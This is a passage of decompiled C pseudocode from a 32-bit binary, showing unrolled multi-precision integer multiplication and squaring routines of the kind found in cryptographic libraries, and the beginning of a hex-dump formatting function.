  v226 = HIDWORD(v223) * (unsigned __int64)a2[7];
  v6 = __CFADD__((_DWORD)v226, v224);
  v227 = v226 + v224;
  v229 = v6;
  v6 = __CFADD__(v6, v225);
  v228 = v229 + v225;
  v6 |= __CFADD__(HIDWORD(v226), v228);
  v228 += HIDWORD(v226);
  v230 = v6;
  v231 = a3[4] * (unsigned __int64)a2[6];
  v6 = __CFADD__((_DWORD)v231, v227);
  v232 = v231 + v227;
  v234 = v6;
  v6 = __CFADD__(v6, v228);
  v233 = v234 + v228;
  v6 |= __CFADD__(HIDWORD(v231), v233);
  v233 += HIDWORD(v231);
  v235 = v6 + v230;
  v236 = a3[5] * (unsigned __int64)a2[5];
  v6 = __CFADD__((_DWORD)v236, v232);
  v237 = v236 + v232;
  v239 = v6;
  v6 = __CFADD__(v6, v233);
  v238 = v239 + v233;
  v6 |= __CFADD__(HIDWORD(v236), v238);
  v238 += HIDWORD(v236);
  v240 = v6 + v235;
  v241 = a3[6] * (unsigned __int64)a2[4];
  v6 = __CFADD__((_DWORD)v241, v237);
  v242 = v241 + v237;
  v244 = v6;
  v6 = __CFADD__(v6, v238);
  v243 = v244 + v238;
  v6 |= __CFADD__(HIDWORD(v241), v243);
  v243 += HIDWORD(v241);
  v245 = v6 + v240;
  v246 = a3[7] * (unsigned __int64)a2[3];
  v6 = __CFADD__(__CFADD__((_DWORD)v246, v242), v243);
  v247 = __CFADD__((_DWORD)v246, v242) + v243;
  v6 |= __CFADD__(HIDWORD(v246), v247);
  v247 += HIDWORD(v246);
  HIDWORD(v246) = a3[4];
  v248 = v6 + v245;
  a1[10] = v246 + v242;
  v249 = HIDWORD(v246) * (unsigned __int64)a2[7];
  v6 = __CFADD__((_DWORD)v249, v247);
  v250 = v249 + v247;
  v252 = v6;
  v6 = __CFADD__(v6, v248);
  v251 = v252 + v248;
  v6 |= __CFADD__(HIDWORD(v249), v251);
  v251 += HIDWORD(v249);
  v253 = v6;
  v254 = a3[5] * (unsigned __int64)a2[6];
  v6 = __CFADD__((_DWORD)v254, v250);
  v255 = v254 + v250;
  v257 = v6;
  v6 = __CFADD__(v6, v251);
  v256 = v257 + v251;
  v6 |= __CFADD__(HIDWORD(v254), v256);
  v256 += HIDWORD(v254);
  v258 = v6 + v253;
  v259 = a3[6] * (unsigned __int64)a2[5];
  v6 = __CFADD__((_DWORD)v259, v255);
  v260 = v259 + v255;
  v262 = v6;
  v6 = __CFADD__(v6, v256);
  v261 = v262 + v256;
  v6 |= __CFADD__(HIDWORD(v259), v261);
  v261 += HIDWORD(v259);
  v263 = v6 + v258;
  v264 = a3[7] * (unsigned __int64)a2[4];
  v6 = __CFADD__(__CFADD__((_DWORD)v264, v260), v261);
  v265 = __CFADD__((_DWORD)v264, v260) + v261;
  v6 |= __CFADD__(HIDWORD(v264), v265);
  v265 += HIDWORD(v264);
  HIDWORD(v264) = a3[5];
  v266 = v6 + v263;
  a1[11] = v264 + v260;
  v267 = HIDWORD(v264) * (unsigned __int64)a2[7];
  v6 = __CFADD__((_DWORD)v267, v265);
  v268 = v267 + v265;
  v270 = v6;
  v6 = __CFADD__(v6, v266);
  v269 = v270 + v266;
  v6 |= __CFADD__(HIDWORD(v267), v269);
  v269 += HIDWORD(v267);
  v271 = v6;
  v272 = a3[6] * (unsigned __int64)a2[6];
  v6 = __CFADD__((_DWORD)v272, v268);
  v273 = v272 + v268;
  v275 = v6;
  v6 = __CFADD__(v6, v269);
  v274 = v275 + v269;
  v6 |= __CFADD__(HIDWORD(v272), v274);
  v274 += HIDWORD(v272);
  v276 = v6 + v271;
  v277 = a3[7] * (unsigned __int64)a2[5];
  v6 = __CFADD__(__CFADD__((_DWORD)v277, v273), v274);
  v278 = __CFADD__((_DWORD)v277, v273) + v274;
  v6 |= __CFADD__(HIDWORD(v277), v278);
  v278 += HIDWORD(v277);
  HIDWORD(v277) = a3[6];
  v279 = v6 + v276;
  a1[12] = v277 + v273;
  v280 = HIDWORD(v277) * (unsigned __int64)a2[7];
  v6 = __CFADD__((_DWORD)v280, v278);
  v281 = v280 + v278;
  v283 = v6;
  v6 = __CFADD__(v6, v279);
  v282 = v283 + v279;
  v6 |= __CFADD__(HIDWORD(v280), v282);
  v282 += HIDWORD(v280);
  v284 = v6;
  v285 = a3[7] * (unsigned __int64)a2[6];
  v6 = __CFADD__(__CFADD__((_DWORD)v285, v281), v282);
  v286 = __CFADD__((_DWORD)v285, v281) + v282;
  v6 |= __CFADD__(HIDWORD(v285), v286);
  v286 += HIDWORD(v285);
  HIDWORD(v285) = a3[7];
  v287 = v6 + v284;
  a1[13] = v285 + v281;
  v288 = HIDWORD(v285) * (unsigned __int64)a2[7];
  v6 = __CFADD__((_DWORD)v288, v286);
  v289 = v288 + v286;
  result = a1;
  a1[14] = v289;
  a1[15] = HIDWORD(v288) + v6 + v287;
  return result;
}

//----- (00439550) --------------------------------------------------------
_DWORD *__cdecl sub_439550(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  int v3; // ecx
  unsigned int v4; // edx
  unsigned __int64 v5; // rax
  bool v6; // cf
  int v7; // ecx
  unsigned __int64 v8; // kr08_8
  unsigned __int64 v9; // rax
  int v10; // ebp
  int v11; // ebx
  unsigned __int64 v12; // rax
  int v13; // ebp
  int v14; // ebx
  BOOL v15; // ett
  BOOL v16; // ecx
  unsigned __int64 v17; // rax
  int v18; // ebp
  int v19; // ebx
  BOOL v20; // ett
  int v21; // ecx
  unsigned __int64 v22; // rax
  int v23; // ebx
  int v24; // ecx
  unsigned __int64 v25; // rax
  int v26; // ebx
  int v27; // ecx
  BOOL v28; // ett
  BOOL v29; // ebp
  unsigned __int64 v30; // rax
  int v31; // ebx
  int v32; // ecx
  BOOL v33; // ett
  int v34; // ebp
  unsigned __int64 v35; // rax
  int v36; // ebx
  int v37; // ecx
  BOOL v38; // ett
  int v39; // ebp
  unsigned __int64 v40; // rax
  int v41; // ecx
  int v42; // ebp
  unsigned __int64 v43; // rax
  int v44; // ecx
  int v45; // ebp
  BOOL v46; // ett
  BOOL v47; // ebx
  unsigned __int64 v48; // rax
  int v49; // ecx
  int v50; // ebp
  BOOL v51; // ett
  int v52; // ebx
  unsigned __int64 v53; // rax
  int v54; // ebp
  int v55; // ebx
  unsigned __int64 v56; // rax
  int v57; // ebp
  int v58; // ebx
  BOOL v59; // ett
  BOOL v60; // ecx
  unsigned __int64 v61; // rax
  int v62; // ebx
  int v63; // ecx
  unsigned __int64 v64; // rax
  int v65; // ebx
  _DWORD *result; // eax

  v3 = (*a3 * (unsigned __int64)*a2) >> 32;
  v4 = *a3;
  *a1 = *a3 * *a2;
  v5 = v4 * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v5, v3);
  v7 = v5 + v3;
  v8 = HIDWORD(v5) + (unsigned __int64)v6;
  v9 = a3[1] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v9, v7), (_DWORD)v8) | __CFADD__(HIDWORD(v9), __CFADD__((_DWORD)v9, v7) + (_DWORD)v8);
  v10 = HIDWORD(v9) + __CFADD__((_DWORD)v9, v7) + (_DWORD)v8;
  HIDWORD(v9) = *a3;
  v11 = v6 + HIDWORD(v8);
  a1[1] = v9 + v7;
  v12 = HIDWORD(v9) * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v12, v10);
  v13 = v12 + v10;
  v15 = v6;
  v6 = __CFADD__(v6, v11);
  v14 = v15 + v11;
  v6 |= __CFADD__(HIDWORD(v12), v14);
  v14 += HIDWORD(v12);
  v16 = v6;
  v17 = a3[1] * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v17, v13);
  v18 = v17 + v13;
  v20 = v6;
  v6 = __CFADD__(v6, v14);
  v19 = v20 + v14;
  v6 |= __CFADD__(HIDWORD(v17), v19);
  v19 += HIDWORD(v17);
  v21 = v6 + v16;
  v22 = a3[2] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v22, v18), v19);
  v23 = __CFADD__((_DWORD)v22, v18) + v19;
  v6 |= __CFADD__(HIDWORD(v22), v23);
  v23 += HIDWORD(v22);
  HIDWORD(v22) = *a3;
  v24 = v6 + v21;
  a1[2] = v22 + v18;
  v25 = HIDWORD(v22) * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v25, v23);
  v26 = v25 + v23;
  v28 = v6;
  v6 = __CFADD__(v6, v24);
  v27 = v28 + v24;
  v6 |= __CFADD__(HIDWORD(v25), v27);
  v27 += HIDWORD(v25);
  v29 = v6;
  v30 = a3[1] * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v30, v26);
  v31 = v30 + v26;
  v33 = v6;
  v6 = __CFADD__(v6, v27);
  v32 = v33 + v27;
  v6 |= __CFADD__(HIDWORD(v30), v32);
  v32 += HIDWORD(v30);
  v34 = v6 + v29;
  v35 = a3[2] * (unsigned __int64)a2[1];
  v6 = __CFADD__((_DWORD)v35, v31);
  v36 = v35 + v31;
  v38 = v6;
  v6 = __CFADD__(v6, v32);
  v37 = v38 + v32;
  v6 |= __CFADD__(HIDWORD(v35), v37);
  v37 += HIDWORD(v35);
  v39 = v6 + v34;
  v40 = a3[3] * (unsigned __int64)*a2;
  v6 = __CFADD__(__CFADD__((_DWORD)v40, v36), v37);
  v41 = __CFADD__((_DWORD)v40, v36) + v37;
  v6 |= __CFADD__(HIDWORD(v40), v41);
  v41 += HIDWORD(v40);
  HIDWORD(v40) = a3[1];
  v42 = v6 + v39;
  a1[3] = v40 + v36;
  v43 = HIDWORD(v40) * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v43, v41);
  v44 = v43 + v41;
  v46 = v6;
  v6 = __CFADD__(v6, v42);
  v45 = v46 + v42;
  v6 |= __CFADD__(HIDWORD(v43), v45);
  v45 += HIDWORD(v43);
  v47 = v6;
  v48 = a3[2] * (unsigned __int64)a2[2];
  v6 = __CFADD__((_DWORD)v48, v44);
  v49 = v48 + v44;
  v51 = v6;
  v6 = __CFADD__(v6, v45);
  v50 = v51 + v45;
  v6 |= __CFADD__(HIDWORD(v48), v50);
  v50 += HIDWORD(v48);
  v52 = v6 + v47;
  v53 = a3[3] * (unsigned __int64)a2[1];
  v6 = __CFADD__(__CFADD__((_DWORD)v53, v49), v50);
  v54 = __CFADD__((_DWORD)v53, v49) + v50;
  v6 |= __CFADD__(HIDWORD(v53), v54);
  v54 += HIDWORD(v53);
  HIDWORD(v53) = a3[2];
  v55 = v6 + v52;
  a1[4] = v53 + v49;
  v56 = HIDWORD(v53) * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v56, v54);
  v57 = v56 + v54;
  v59 = v6;
  v6 = __CFADD__(v6, v55);
  v58 = v59 + v55;
  v6 |= __CFADD__(HIDWORD(v56), v58);
  v58 += HIDWORD(v56);
  v60 = v6;
  v61 = a3[3] * (unsigned __int64)a2[2];
  v6 = __CFADD__(__CFADD__((_DWORD)v61, v57), v58);
  v62 = __CFADD__((_DWORD)v61, v57) + v58;
  v6 |= __CFADD__(HIDWORD(v61), v62);
  v62 += HIDWORD(v61);
  HIDWORD(v61) = a3[3];
  v63 = v6 + v60;
  a1[5] = v61 + v57;
  v64 = HIDWORD(v61) * (unsigned __int64)a2[3];
  v6 = __CFADD__((_DWORD)v64, v62);
  v65 = v64 + v62;
  result = a1;
  a1[6] = v65;
  a1[7] = HIDWORD(v64) + v6 + v63;
  return result;
}

//----- (00439690) --------------------------------------------------------
unsigned __int64 __cdecl sub_439690(int a1, unsigned int *a2)
{
  unsigned __int64 v3; // kr00_8
  unsigned int v4; // edx
  unsigned __int64 v5; // rax
  bool v6; // cf
  BOOL v7; // ebx
  int v8; // ecx
  unsigned int v9; // ebp
  int v10; // ebx
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // kr10_8
  int v13; // ecx
  unsigned __int64 v14; // rax
  unsigned int v15; // ebx
  int v16; // ecx
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // kr20_8
  int v19; // ebp
  unsigned __int64 v20; // rax
  int v21; // ebp
  unsigned int v22; // ecx
  int v23; // ebx
  unsigned int v24; // ebp
  unsigned __int64 v25; // rax
  unsigned __int64 v26; // kr30_8
  int v27; // ebx
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // kr38_8
  int v30; // ebx
  unsigned __int64 v31; // rax
  unsigned int v32; // ebp
  int v33; // ebx
  unsigned __int64 v34; // rax
  unsigned __int64 v35; // kr48_8
  int v36; // ecx
  unsigned __int64 v37; // rax
  unsigned __int64 v38; // kr50_8
  int v39; // ecx
  unsigned __int64 v40; // rax
  int v41; // ecx
  unsigned int v42; // ebx
  int v43; // ebp
  int v44; // ecx
  unsigned __int64 v45; // rax
  unsigned __int64 v46; // kr60_8
  int v47; // ebp
  unsigned __int64 v48; // rax
  unsigned __int64 v49; // kr68_8
  int v50; // ebp
  unsigned __int64 v51; // rax
  unsigned __int64 v52; // kr70_8
  int v53; // ebp
  unsigned __int64 v54; // rax
  unsigned int v55; // ecx
  int v56; // ebp
  unsigned __int64 v57; // rax
  unsigned __int64 v58; // kr80_8
  int v59; // ebx
  unsigned __int64 v60; // rax
  unsigned __int64 v61; // kr88_8
  int v62; // ebx
  unsigned __int64 v63; // rax
  unsigned __int64 v64; // kr90_8
  int v65; // ebx
  unsigned __int64 v66; // rax
  int v67; // ebx
  int v68; // ecx
  unsigned int v69; // ebp
  int v70; // ebx
  unsigned __int64 v71; // rax
  unsigned __int64 v72; // krA0_8
  int v73; // ecx
  unsigned __int64 v74; // rax
  unsigned __int64 v75; // krA8_8
  int v76; // ecx
  unsigned __int64 v77; // rax
  unsigned __int64 v78; // krB0_8
  int v79; // ecx
  unsigned __int64 v80; // rax
  unsigned int v81; // ebx
  int v82; // ecx
  unsigned __int64 v83; // rax
  unsigned __int64 v84; // krC0_8
  int v85; // ebp
  unsigned __int64 v86; // rax
  unsigned __int64 v87; // krC8_8
  int v88; // ebp
  unsigned __int64 v89; // rax
  int v90; // ebp
  unsigned int v91; // ecx
  int v92; // ebx
  int v93; // ebp
  unsigned __int64 v94; // rax
  unsigned __int64 v95; // krD8_8
  int v96; // ebx
  unsigned __int64 v97; // rax
  unsigned __int64 v98; // krE0_8
  int v99; // ebx
  unsigned __int64 v100; // rax
  unsigned int v101; // ebp
  int v102; // ebx
  unsigned __int64 v103; // rax
  unsigned __int64 v104; // krF0_8
  int v105; // ecx
  unsigned __int64 v106; // rax
  int v107; // ecx
  unsigned int v108; // ebx
  int v109; // ebp
  unsigned int v110; // ecx
  unsigned __int64 v111; // rax
  unsigned __int64 v112; // kr100_8
  int v113; // ebp
  unsigned __int64 v114; // rax
  unsigned int v115; // ecx
  int v116; // ebp
  unsigned __int64 v117; // rax
  BOOL v118; // ebx
  unsigned int v119; // ebp
  int v120; // kr110_4
  unsigned __int64 result; // rax

  v3 = *a2 * (unsigned __int64)*a2;
  v4 = *a2;
  *(_DWORD *)a1 = v3;
  v5 = v4 * (unsigned __int64)a2[1];
  v6 = __CFADD__(v5, v5);
  v5 *= 2i64;
  v7 = v6;
  v6 = __CFADD__(v5, HIDWORD(v3));
  v9 = (v5 + HIDWORD(v3)) >> 32;
  v8 = v5 + HIDWORD(v3);
  LODWORD(v5) = a2[2];
  v10 = v6 + v7;
  *(_DWORD *)(a1 + 4) = v8;
  v11 = *a2 * (unsigned __int64)(unsigned int)v5;
  v6 = __CFADD__(v11, v11);
  v11 *= 2i64;
  v12 = v11 + __PAIR64__(v10, v9);
  v13 = __CFADD__(v11, __PAIR64__(v10, v9)) + v6;
  v14 = a2[1] * (unsigned __int64)a2[1];
  v6 = __CFADD__(v14, v12);
  v15 = (v14 + v12) >> 32;
  HIDWORD(v14) = *a2;
  v16 = v6 + v13;
  *(_DWORD *)(a1 + 8) = v14 + v12;
  v17 = HIDWORD(v14) * (unsigned __int64)a2[3];
  v6 = __CFADD__(v17, v17);
  v17 *= 2i64;
  v18 = v17 + __PAIR64__(v16, v15);
  v19 = __CFADD__(v17, __PAIR64__(v16, v15)) + v6;
  v20 = a2[1] * (unsigned __int64)a2[2];
  v6 = __CFADD__(v20, v20);
  v20 *= 2i64;
  v21 = v6 + v19;
  v6 = __CFADD__(v20, v18);
  v22 = (v20 + v18) >> 32;
  v23 = v20 + v18;
  LODWORD(v20) = a2[4];
  v24 = v6 + v21;
  *(_DWORD *)(a1 + 12) = v23;
  v25 = *a2 * (unsigned __int64)(unsigned int)v20;
  v6 = __CFADD__(v25, v25);
  v25 *= 2i64;
  v26 = v25 + __PAIR64__(v24, v22);
  v27 = __CFADD__(v25, __PAIR64__(v24, v22)) + v6;
  v28 = a2[1] * (unsigned __int64)a2[3];
  v6 = __CFADD__(v28, v28);
  v28 *= 2i64;
  v29 = v28 + v26;
  v30 = __CFADD__(v28, v26) + v6 + v27;
  v31 = a2[2] * (unsigned __int64)a2[2];
  v6 = __CFADD__(v31, v29);
  v32 = (v31 + v29) >> 32;
  HIDWORD(v31) = *a2;
  v33 = v6 + v30;
  *(_DWORD *)(a1 + 16) = v31 + v29;
  v34 = HIDWORD(v31) * (unsigned __int64)a2[5];
  v6 = __CFADD__(v34, v34);
  v34 *= 2i64;
  v35 = v34 + __PAIR64__(v33, v32);
  v36 = __CFADD__(v34, __PAIR64__(v33, v32)) + v6;
  v37 = a2[1] * (unsigned __int64)a2[4];
  v6 = __CFADD__(v37, v37);
  v37 *= 2i64;
  v38 = v37 + v35;
  v39 = __CFADD__(v37, v35) + v6 + v36;
  v40 = a2[2] * (unsigned __int64)a2[3];
  v6 = __CFADD__(v40, v40);
  v40 *= 2i64;
  v41 = v6 + v39;
  v6 = __CFADD__(v40, v38);
  v42 = (v40 + v38) >> 32;
  v43 = v40 + v38;
  LODWORD(v40) = a2[6];
  v44 = v6 + v41;
  *(_DWORD *)(a1 + 20) = v43;
  v45 = *a2 * (unsigned __int64)(unsigned int)v40;
  v6 = __CFADD__(v45, v45);
  v45 *= 2i64;
  v46 = v45 + __PAIR64__(v44, v42);
  v47 = __CFADD__(v45, __PAIR64__(v44, v42)) + v6;
  v48 = a2[1] * (unsigned __int64)a2[5];
  v6 = __CFADD__(v48, v48);
  v48 *= 2i64;
  v49 = v48 + v46;
  v50 = __CFADD__(v48, v46) + v6 + v47;
  v51 = a2[2] * (unsigned __int64)a2[4];
  v6 = __CFADD__(v51, v51);
  v51 *= 2i64;
  v52 = v51 + v49;
  v53 = __CFADD__(v51, v49) + v6 + v50;
  v54 = a2[3] * (unsigned __int64)a2[3];
  v6 = __CFADD__(v54, v52);
  v55 = (v54 + v52) >> 32;
  HIDWORD(v54) = *a2;
  v56 = v6 + v53;
  *(_DWORD *)(a1 + 24) = v54 + v52;
  v57 = HIDWORD(v54) * (unsigned __int64)a2[7];
  v6 = __CFADD__(v57, v57);
  v57 *= 2i64;
  v58 = v57 + __PAIR64__(v56, v55);
  v59 = __CFADD__(v57, __PAIR64__(v56, v55)) + v6;
  v60 = a2[1] * (unsigned __int64)a2[6];
  v6 = __CFADD__(v60, v60);
  v60 *= 2i64;
  v61 = v60 + v58;
  v62 = __CFADD__(v60, v58) + v6 + v59;
  v63 = a2[2] * (unsigned __int64)a2[5];
  v6 = __CFADD__(v63, v63);
  v63 *= 2i64;
  v64 = v63 + v61;
  v65 = __CFADD__(v63, v61) + v6 + v62;
  v66 = a2[3] * (unsigned __int64)a2[4];
  v6 = __CFADD__(v66, v66);
  v66 *= 2i64;
  v67 = v6 + v65;
  v6 = __CFADD__(v66, v64);
  v69 = (v66 + v64) >> 32;
  v68 = v66 + v64;
  LODWORD(v66) = a2[7];
  v70 = v6 + v67;
  *(_DWORD *)(a1 + 28) = v68;
  v71 = a2[1] * (unsigned __int64)(unsigned int)v66;
  v6 = __CFADD__(v71, v71);
  v71 *= 2i64;
  v72 = v71 + __PAIR64__(v70, v69);
  v73 = __CFADD__(v71, __PAIR64__(v70, v69)) + v6;
  v74 = a2[2] * (unsigned __int64)a2[6];
  v6 = __CFADD__(v74, v74);
  v74 *= 2i64;
  v75 = v74 + v72;
  v76 = __CFADD__(v74, v72) + v6 + v73;
  v77 = a2[3] * (unsigned __int64)a2[5];
  v6 = __CFADD__(v77, v77);
  v77 *= 2i64;
  v78 = v77 + v75;
  v79 = __CFADD__(v77, v75) + v6 + v76;
  v80 = a2[4] * (unsigned __int64)a2[4];
  v6 = __CFADD__(v80, v78);
  v81 = (v80 + v78) >> 32;
  HIDWORD(v80) = a2[2];
  v82 = v6 + v79;
  *(_DWORD *)(a1 + 32) = v80 + v78;
  v83 = HIDWORD(v80) * (unsigned __int64)a2[7];
  v6 = __CFADD__(v83, v83);
  v83 *= 2i64;
  v84 = v83 + __PAIR64__(v82, v81);
  v85 = __CFADD__(v83, __PAIR64__(v82, v81)) + v6;
  v86 = a2[3] * (unsigned __int64)a2[6];
  v6 = __CFADD__(v86, v86);
  v86 *= 2i64;
  v87 = v86 + v84;
  v88 = __CFADD__(v86, v84) + v6 + v85;
  v89 = a2[4] * (unsigned __int64)a2[5];
  v6 = __CFADD__(v89, v89);
  v89 *= 2i64;
  v90 = v6 + v88;
  v6 = __CFADD__(v89, v87);
  v91 = (v89 + v87) >> 32;
  v92 = v89 + v87;
  LODWORD(v89) = a2[7];
  v93 = v6 + v90;
  *(_DWORD *)(a1 + 36) = v92;
  v94 = a2[3] * (unsigned __int64)(unsigned int)v89;
  v6 = __CFADD__(v94, v94);
  v94 *= 2i64;
  v95 = v94 + __PAIR64__(v93, v91);
  v96 = __CFADD__(v94, __PAIR64__(v93, v91)) + v6;
  v97 = a2[4] * (unsigned __int64)a2[6];
  v6 = __CFADD__(v97, v97);
  v97 *= 2i64;
  v98 = v97 + v95;
  v99 = __CFADD__(v97, v95) + v6 + v96;
  v100 = a2[5] * (unsigned __int64)a2[5];
  v6 = __CFADD__(v100, v98);
  v101 = (v100 + v98) >> 32;
  HIDWORD(v100) = a2[4];
  v102 = v6 + v99;
  *(_DWORD *)(a1 + 40) = v100 + v98;
  v103 = HIDWORD(v100) * (unsigned __int64)a2[7];
  v6 = __CFADD__(v103, v103);
  v103 *= 2i64;
  v104 = v103 + __PAIR64__(v102, v101);
  v105 = __CFADD__(v103, __PAIR64__(v102, v101)) + v6;
  v106 = a2[5] * (unsigned __int64)a2[6];
  v6 = __CFADD__(v106, v106);
  v106 *= 2i64;
  v107 = v6 + v105;
  v6 = __CFADD__(v106, v104);
  v108 = (v106 + v104) >> 32;
  v109 = v106 + v104;
  LODWORD(v106) = a2[7];
  v110 = v6 + v107;
  *(_DWORD *)(a1 + 44) = v109;
  v111 = a2[5] * (unsigned __int64)(unsigned int)v106;
  v6 = __CFADD__(v111, v111);
  v111 *= 2i64;
  v112 = v111 + __PAIR64__(v110, v108);
  v113 = __CFADD__(v111, __PAIR64__(v110, v108)) + v6;
  v114 = a2[6] * (unsigned __int64)a2[6];
  v6 = __CFADD__(v114, v112);
  v115 = (v114 + v112) >> 32;
  HIDWORD(v114) = a2[6];
  v116 = v6 + v113;
  *(_DWORD *)(a1 + 48) = v114 + v112;
  v117 = HIDWORD(v114) * (unsigned __int64)a2[7];
  v6 = __CFADD__(v117, v117);
  v117 *= 2i64;
  v118 = v6;
  v6 = __CFADD__(v117, __PAIR64__(v116, v115));
  v120 = v117 + v115;
  v119 = (v117 + __PAIR64__(v116, v115)) >> 32;
  LODWORD(v117) = a2[7];
  *(_DWORD *)(a1 + 52) = v120;
  result = (unsigned int)v117 * (unsigned __int64)(unsigned int)v117;
  *(_QWORD *)(a1 + 56) = result + __PAIR64__((unsigned int)v6 + v118, v119);
  return result;
}

//----- (004399C0) --------------------------------------------------------
unsigned __int64 __cdecl sub_4399C0(int a1, unsigned int *a2)
{
  unsigned __int64 v3; // kr00_8
  unsigned int v4; // edx
  unsigned __int64 v5; // rax
  bool v6; // cf
  BOOL v7; // ebx
  int v8; // ecx
  unsigned int v9; // ebp
  int v10; // ebx
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // kr10_8
  int v13; // ecx
  unsigned __int64 v14; // rax
  unsigned int v15; // ebx
  int v16; // ecx
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // kr20_8
  int v19; // ebp
  unsigned __int64 v20; // rax
  int v21; // ebp
  unsigned int v22; // ecx
  int v23; // ebx
  unsigned int v24; // ebp
  unsigned __int64 v25; // rax
  unsigned __int64 v26; // kr30_8
  int v27; // ebx
  unsigned __int64 v28; // rax
  unsigned int v29; // ebp
  int v30; // ebx
  unsigned __int64 v31; // rax
  BOOL v32; // ecx
  unsigned int v33; // ebx
  int v34; // kr40_4
  unsigned __int64 result; // rax

  v3 = *a2 * (unsigned __int64)*a2;
  v4 = *a2;
  *(_DWORD *)a1 = v3;
  v5 = v4 * (unsigned __int64)a2[1];
  v6 = __CFADD__(v5, v5);
  v5 *= 2i64;
  v7 = v6;
  v6 = __CFADD__(v5, HIDWORD(v3));
  v9 = (v5 + HIDWORD(v3)) >> 32;
  v8 = v5 + HIDWORD(v3);
  LODWORD(v5) = a2[2];
  v10 = v6 + v7;
  *(_DWORD *)(a1 + 4) = v8;
  v11 = *a2 * (unsigned __int64)(unsigned int)v5;
  v6 = __CFADD__(v11, v11);
  v11 *= 2i64;
  v12 = v11 + __PAIR64__(v10, v9);
  v13 = __CFADD__(v11, __PAIR64__(v10, v9)) + v6;
  v14 = a2[1] * (unsigned __int64)a2[1];
  v6 = __CFADD__(v14, v12);
  v15 = (v14 + v12) >> 32;
  HIDWORD(v14) = *a2;
  v16 = v6 + v13;
  *(_DWORD *)(a1 + 8) = v14 + v12;
  v17 = HIDWORD(v14) * (unsigned __int64)a2[3];
  v6 = __CFADD__(v17, v17);
  v17 *= 2i64;
  v18 = v17 + __PAIR64__(v16, v15);
  v19 = __CFADD__(v17, __PAIR64__(v16, v15)) + v6;
  v20 = a2[1] * (unsigned __int64)a2[2];
  v6 = __CFADD__(v20, v20);
  v20 *= 2i64;
  v21 = v6 + v19;
  v6 = __CFADD__(v20, v18);
  v22 = (v20 + v18) >> 32;
  v23 = v20 + v18;
  LODWORD(v20) = a2[3];
  v24 = v6 + v21;
  *(_DWORD *)(a1 + 12) = v23;
  v25 = a2[1] * (unsigned __int64)(unsigned int)v20;
  v6 = __CFADD__(v25, v25);
  v25 *= 2i64;
  v26 = v25 + __PAIR64__(v24, v22);
  v27 = __CFADD__(v25, __PAIR64__(v24, v22)) + v6;
  v28 = a2[2] * (unsigned __int64)a2[2];
  v6 = __CFADD__(v28, v26);
  v29 = (v28 + v26) >> 32;
  HIDWORD(v28) = a2[2];
  v30 = v6 + v27;
  *(_DWORD *)(a1 + 16) = v28 + v26;
  v31 = HIDWORD(v28) * (unsigned __int64)a2[3];
  v6 = __CFADD__(v31, v31);
  v31 *= 2i64;
  v32 = v6;
  v6 = __CFADD__(v31, __PAIR64__(v30, v29));
  v34 = v31 + v29;
  v33 = (v31 + __PAIR64__(v30, v29)) >> 32;
  LODWORD(v31) = a2[3];
  *(_DWORD *)(a1 + 20) = v34;
  result = (unsigned int)v31 * (unsigned __int64)(unsigned int)v31;
  *(_QWORD *)(a1 + 24) = result + __PAIR64__((unsigned int)v6 + v32, v33);
  return result;
}

//----- (00439AB0) --------------------------------------------------------
int __cdecl sub_439AB0(int (__cdecl *a1)(char *, unsigned int, int), int a2, int a3, int a4, signed int Size)
{
  int v5; // ebp
  int v6; // ebx
  signed int v7; // esi
  char v8; // al
  int v9; // ecx
  int v10; // edi
  int v11; // eax
  int v12; // ebx
  int v13; // esi
  int v14; // ebp
  int v15; // esi
  int v16; // ebp
  int v17; // eax
  int v19; // [esp+Ch] [ebp-1D8h]
  int v20; // [esp+10h] [ebp-1D4h]
  int v21; // [esp+20h] [ebp-1C4h]
  char v22[20]; // [esp+24h] [ebp-1C0h] BYREF
  char v23[292]; // [esp+38h] [ebp-1ACh] BYREF
  char v24[132]; // [esp+15Ch] [ebp-88h] BYREF

  v5 = a4;
  v6 = 0;
  v7 = Size;
  v19 = 0;
  v20 = 0;
  if ( a4 > 0 )
  {
    do
    {
      v8 = *(_BYTE *)(a3 + v5 - 1);
      if ( v8 != 32 && v8 )
        break;
      --v5;
      ++v6;
    }
    while ( v5 > 0 );
    v20 = v6;
    a4 = v5;
  }
  if ( Size >= 0 )
  {
    if ( Size )
    {
      if ( Size > 128 )
        v7 = 128;
      memset(v24, 32, v7);
    }
  }
  else
  {
    v7 = 0;
  }
  v24[v7] = 0;
  v9 = 6;
  if ( v7 <= 6 )
    v9 = v7;
  v10 = 16 - (v7 - v9 + 3) / 4;
  v11 = v5 / v10;
  if ( v10 * (v5 / v10) < v5 )
    ++v11;
  if ( v11 > 0 )
  {
    v12 = 0;
    v21 = v11;
    do
    {
      sub_424880(v23, v24, 0x121u);
      sub_4191B0((int)v22, 20, "%04x - ", v12);
      sub_4248C0(v23, v22, 0x121u);
      v13 = 0;
      if ( v10 > 0 )
      {
        v14 = v12;
        do
        {
          if ( v14 < a4 )
          {
            sub_4191B0((int)v22, 20, "%02x%c", *(unsigned __int8 *)(v12 + a3 + v13));
            sub_4248C0(v23, v22, 0x121u);
          }
          else
          {
            sub_4248C0(v23, "   ", 0x121u);
          }
          ++v13;
          ++v14;
        }
        while ( v13 < v10 );
      }
      sub_4248C0(v23, "  ", 0x121u);
      v15 = 0;
      if ( v10 > 0 )
      {
        v16 = v12;
        do
        {
          if ( v16 >= a4 )
            break;
          v17 = *(unsigned __int8 *)(v12 + a3 + v15);
          if ( (unsigned __int8)(*(_BYTE *)(v12 + a3 + v15) - 32) > 0x5Eu )
            v17 = 46;
          sub_4191B0((int)v22, 20, "%c", v17);
          sub_4248C0(v23, v22, 0x121u);
          ++v15;
          ++v16;
        }
        while ( v15 < v10 );
      }
